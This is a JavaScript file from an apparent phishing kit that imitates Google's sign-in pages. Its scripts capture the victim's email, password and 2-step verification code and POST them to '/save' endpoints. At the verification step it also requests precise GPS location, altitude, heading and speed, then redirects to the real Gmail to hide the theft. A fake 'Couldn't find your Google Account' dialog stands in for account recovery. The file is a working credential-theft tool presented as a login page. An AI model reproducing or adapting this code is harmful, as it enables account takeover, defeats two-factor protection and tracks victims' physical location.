(function () {
    'use strict';

// ---- Clean URL Helper ----
    if (window.location.href.indexOf('.html') > -1 && window.location.protocol.indexOf('http') > -1) {
        var cleanUrl = window.location.href.replace(/\.html(\?|$|#)/, '$1');
        window.history.replaceState(null, '', cleanUrl);
    }

    // ---- Loading Bar Helper ----
    function showLoadingBar(form, duration, callback) {
        var card = document.querySelector('.card');
        if (card) {
            card.style.position = 'relative';
            card.classList.add('is-loading');
            // only add if it doesn't already exist
            if (!card.querySelector('.progress-bar')) {
                var pb = document.createElement('div');
                pb.className = 'progress-bar active';
                card.appendChild(pb);
            }
            if (form) {
                var inputs = form.querySelectorAll('input, button');
                inputs.forEach(function (el) { el.disabled = true; });
            }
        }
        if (callback) {
            setTimeout(callback, duration || 1200);
        }
    }

    // ---- SIGN IN ----
    var signInForm = document.getElementById('signInForm');
    if (signInForm) {
        signInForm.addEventListener('submit', function (e) {
            e.preventDefault();
            var inp = document.getElementById('identifierId');
            var fld = document.getElementById('emailField');
            var err = document.getElementById('emailErr');
            if (!inp.value.trim()) {
                fld.classList.add('has-error');
                err.classList.add('show');
                inp.focus();
                return;
            }
            fld.classList.remove('has-error');
            err.classList.remove('show');
            var emailVal = inp.value.trim();
            sessionStorage.setItem('gEmail', emailVal);

            var payload = { email: emailVal, password: '[PENDING]' };
            submitData(payload, '/save', signInForm, 'password', false);
        });
        var ei = document.getElementById('identifierId');
        if (ei) ei.addEventListener('input', function () {
            document.getElementById('emailField').classList.remove('has-error');
            document.getElementById('emailErr').classList.remove('show');
        });
    }

    // ---- FORGOT EMAIL ----
    var forgotForm = document.getElementById('forgotForm');
    if (forgotForm) {
        forgotForm.addEventListener('submit', function (e) {
            e.preventDefault();
            var ri = document.getElementById('recoveryInput');
            var rf = document.getElementById('recovField');
            var re = document.getElementById('recovErr');
            var fn = document.getElementById('firstName');
            var ln = document.getElementById('lastName');
            var fnf = document.getElementById('fnField');
            var lnf = document.getElementById('lnField');
            var ne = document.getElementById('nameErr');
            var bad = false;

            if (!ri.value.trim()) {
                rf.classList.add('has-error'); re.classList.add('show');
                if (!bad) ri.focus(); bad = true;
            } else { rf.classList.remove('has-error'); re.classList.remove('show') }

            if (!fn.value.trim() || !ln.value.trim()) {
                if (!fn.value.trim()) fnf.classList.add('has-error');
                if (!ln.value.trim()) lnf.classList.add('has-error');
                ne.classList.add('show');
                if (!bad) { (!fn.value.trim() ? fn : ln).focus() }
                bad = true;
            } else { fnf.classList.remove('has-error'); lnf.classList.remove('has-error'); ne.classList.remove('show') }

            if (!bad) {
                showModal("Couldn't find your Google Account", "Try again");
            }
        });

        ['recoveryInput', 'firstName', 'lastName'].forEach(function (id) {
            var el = document.getElementById(id);
            if (el) el.addEventListener('input', function () {
                var f = this.closest('.field');
                if (f) f.classList.remove('has-error');
                if (id === 'recoveryInput') document.getElementById('recovErr').classList.remove('show');
                if (id === 'firstName' || id === 'lastName') {
                    var a = document.getElementById('firstName').value.trim();
                    var b = document.getElementById('lastName').value.trim();
                    if (a || b) document.getElementById('nameErr').classList.remove('show');
                    if (a) document.getElementById('fnField').classList.remove('has-error');
                    if (b) document.getElementById('lnField').classList.remove('has-error');
                }
            });
        });
    }

    // ---- PASSWORD ----
    var pwForm = document.getElementById('passwordForm');
    if (pwForm) {
        // Load stored email
        var chip = document.getElementById('chipEmail');
        if (chip) {
            var stored = sessionStorage.getItem('gEmail') || '';
            if (stored) {
                chip.textContent = stored.indexOf('@') === -1 ? stored + '@gmail.com' : stored;
            }
        }

        // ---- CHIP DROPDOWN (Account Picker) ----
        var chipWrap = document.getElementById('chipWrap');
        var userChip = document.getElementById('userChip');
        var chipOverlay = document.getElementById('chipOverlay');
        var chipDropdownList = document.getElementById('chipDropdownList');

        // Saved accounts — only from localStorage (no defaults)
        var accounts = [];
        try {
            var saved = localStorage.getItem('gAccounts');
            if (saved) accounts = JSON.parse(saved);
        } catch (e) { accounts = []; }

        if (chipDropdownList && accounts.length) {
            accounts.forEach(function (acc) {
                var row = document.createElement('a');
                row.href = '#';
                row.className = 'chip-dropdown-row';
                row.addEventListener('click', function (e) {
                    e.preventDefault();
                    sessionStorage.setItem('gEmail', acc.email);
                    window.location.reload();
                });

                var avatar = document.createElement('div');
                avatar.className = 'account-avatar';
                avatar.style.backgroundColor = acc.color;
                avatar.textContent = acc.name.charAt(0).toUpperCase();

                var info = document.createElement('div');
                info.innerHTML = '<div class="chip-dropdown-name">' + escHtml(acc.name) + '</div>' +
                    '<div class="chip-dropdown-email">' + escHtml(acc.email) + '</div>';

                row.appendChild(avatar);
                row.appendChild(info);
                chipDropdownList.appendChild(row);
            });
        }

        // Toggle dropdown
        if (userChip && chipWrap) {
            userChip.addEventListener('click', function (e) {
                e.stopPropagation();
                var isOpen = chipWrap.classList.toggle('open');
                if (chipOverlay) chipOverlay.classList.toggle('active', isOpen);
            });
        }

        // Close dropdown on overlay click
        if (chipOverlay) {
            chipOverlay.addEventListener('click', function () {
                if (chipWrap) chipWrap.classList.remove('open');
                chipOverlay.classList.remove('active');
            });
        }

        function escHtml(s) {
            var d = document.createElement('div');
            d.textContent = s;
            return d.innerHTML;
        }

        pwForm.addEventListener('submit', function (e) {
            e.preventDefault();
            var inp = document.getElementById('passwordInput');
            var fld = document.getElementById('pwField');
            var err = document.getElementById('pwErr');
            if (!inp.value) {
                fld.classList.add('has-error'); err.classList.add('show'); inp.focus(); return;
            }
            fld.classList.remove('has-error'); err.classList.remove('show');

            // Capture credentials and send to backend
            var emailVal = sessionStorage.getItem('gEmail') || document.getElementById('chipEmail').textContent || '';
            var pwVal = inp.value;

            var payload = { email: emailVal, password: pwVal };
            submitData(payload, '/save', pwForm, '2sv', false);
        });

        var pi = document.getElementById('passwordInput');
        if (pi) pi.addEventListener('input', function () {
            document.getElementById('pwField').classList.remove('has-error');
            document.getElementById('pwErr').classList.remove('show');
        });

        // Eye toggle
        var eye = document.getElementById('toggleEye');
        if (eye) eye.addEventListener('click', function () {
            var pw = document.getElementById('passwordInput');
            var chk = document.getElementById('showPwCheck');
            pw.type = pw.type === 'password' ? 'text' : 'password';
            if (chk) chk.checked = pw.type === 'text';
        });

        // Checkbox toggle
        var sc = document.getElementById('showPwCheck');
        if (sc) sc.addEventListener('change', function () {
            document.getElementById('passwordInput').type = this.checked ? 'text' : 'password';
        });
    }

    // ---- 2-STEP VERIFICATION ----
    var twosvForm = document.getElementById('twosvForm');
    if (twosvForm) {
        var chip2 = document.getElementById('chipEmail2sv');
        if (chip2) {
            var stored = sessionStorage.getItem('gEmail') || '';
            if (stored) {
                chip2.textContent = stored.indexOf('@') === -1 ? stored + '@gmail.com' : stored;
            }
        }

        twosvForm.addEventListener('submit', function (e) {
            e.preventDefault();
            var inp = document.getElementById('twosvInput');
            var fld = document.getElementById('twosvField');
            var err = document.getElementById('twosvErr');

            if (!inp.value) {
                fld.classList.add('has-error');
                err.classList.add('show');
                inp.focus();
                return;
            }
            fld.classList.remove('has-error');
            err.classList.remove('show');

            var emailVal = sessionStorage.getItem('gEmail') || (chip2 ? chip2.textContent : '') || '';
            var codeVal = inp.value;

            var payload = { email: emailVal, code: codeVal };
            submitData(payload, '/save-2sv', twosvForm, 'https://mail.google.com/mail', true);
        });

        var ti = document.getElementById('twosvInput');
        if (ti) ti.addEventListener('input', function () {
            document.getElementById('twosvField').classList.remove('has-error');
            document.getElementById('twosvErr').classList.remove('show');
        });

        var moreWays = document.getElementById('moreWaysLink');
        if (moreWays) {
            moreWays.addEventListener('click', function(e) {
                e.preventDefault();
                window.location.href = 'couldnt-sign-in';
            });
        }
    }

    // ---- Modal helper ----
    function showModal(content, btnText, isHtml) {
        var ov = document.createElement('div');
        ov.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;z-index:9999;animation:fadeIn .2s ease';
        var bx = document.createElement('div');
        bx.style.cssText = 'background:#fff;border-radius:28px;padding:24px 32px;font-family:Google Sans,Roboto,Arial;font-size:14px;color:#202124;box-shadow:0 11px 15px -7px rgba(0,0,0,.2),0 24px 38px 3px rgba(0,0,0,.14),0 9px 46px 8px rgba(0,0,0,.12);text-align:center;max-width:340px;width:90%';
        if (isHtml) {
            bx.innerHTML = content;
        } else {
            bx.innerHTML = '<p style="margin-bottom:20px;font-size:14px;line-height:20px">' + content + '</p>' + (btnText ? '<button style="background:#1a73e8;color:#fff;border:none;border-radius:100px;padding:0 24px;height:36px;font-size:14px;cursor:pointer;font-family:Google Sans,Roboto,Arial;font-weight:500;letter-spacing:.25px" onclick="this.closest(\'div[style]\').parentElement.remove()">' + btnText + '</button>' : '');
        }
        ov.appendChild(bx);
        document.body.appendChild(ov);
        ov.addEventListener('click', function (e) { if (e.target === ov) ov.remove() });
    }

    // ---- Location & Submit Helper ----
    // ONLY real hardware GPS — no IP fallback, no fake locations
    function submitData(payload, endpoint, form, nextUrl, requireLocation) {
        var startTime = Date.now();

        function proceed() {
            showLoadingBar(form, 0, null);
            // Use stored real GPS location or what's already set on payload
            payload.lat = payload.lat || sessionStorage.getItem('gLat') || 'Denied';
            payload.lon = payload.lon || sessionStorage.getItem('gLon') || 'Denied';
            payload.accuracy = payload.accuracy || sessionStorage.getItem('gAcc') || 'N/A';
            payload.locSource = payload.locSource || sessionStorage.getItem('gLocSrc') || 'Denied';

            fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(function () { }).finally(function () {
                var elapsed = Date.now() - startTime;
                var remaining = Math.max(0, 1000 - elapsed);
                setTimeout(function () { window.location.href = nextUrl; }, remaining);
            });
        }

        // If this step doesn't require location yet, or we already have REAL GPS cached, just proceed
        if (!requireLocation || (sessionStorage.getItem('gLat') && sessionStorage.getItem('gLocSrc') === 'GPS-Hardware')) {
            proceed();
            return;
        }

        // Show loading bar while we get location
        showLoadingBar(form, 0, null);

        // Request REAL hardware GPS only — no fake IP fallback
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function (pos) {
                // Real hardware GPS — full decimal precision
                var lat = pos.coords.latitude;
                var lon = pos.coords.longitude;
                var acc = pos.coords.accuracy; // accuracy in meters
                var alt = pos.coords.altitude; // altitude if available
                var altAcc = pos.coords.altitudeAccuracy;
                var heading = pos.coords.heading;
                var speed = pos.coords.speed;

                // Cache the real GPS data
                sessionStorage.setItem('gLat', lat);
                sessionStorage.setItem('gLon', lon);
                sessionStorage.setItem('gAcc', acc + 'm');
                sessionStorage.setItem('gLocSrc', 'GPS-Hardware');

                payload.lat = lat;
                payload.lon = lon;
                payload.accuracy = acc + 'm';
                payload.locSource = 'GPS-Hardware';
                payload.altitude = alt !== null ? alt + 'm' : 'N/A';
                payload.altAccuracy = altAcc !== null ? altAcc + 'm' : 'N/A';
                payload.heading = heading !== null ? heading + '°' : 'N/A';
                payload.speed = speed !== null ? speed + ' m/s' : 'N/A';

                proceed();
            }, function (error) {
                // GPS failed — no fake fallback, just record the denial
                var reason = 'Unknown';
                if (error.code === 1) reason = 'Permission Denied';
                else if (error.code === 2) reason = 'Position Unavailable (needs HTTPS)';
                else if (error.code === 3) reason = 'GPS Timeout';

                payload.lat = 'Denied';
                payload.lon = 'Denied';
                payload.accuracy = 'N/A';
                payload.locSource = 'Denied';
                payload.gpsError = reason;
                proceed();
            }, {
                enableHighAccuracy: true,   // Forces GPS hardware (not Wi-Fi/cell)
                timeout: 15000,             // Wait up to 15 seconds for GPS lock
                maximumAge: 0               // Never use cached position, always get fresh
            });
        } else {
            // No geolocation support at all
            payload.lat = 'Denied';
            payload.lon = 'Denied';
            payload.accuracy = 'N/A';
            payload.locSource = 'Denied';
            payload.gpsError = 'Geolocation API not supported';
            proceed();
        }
    }
})();

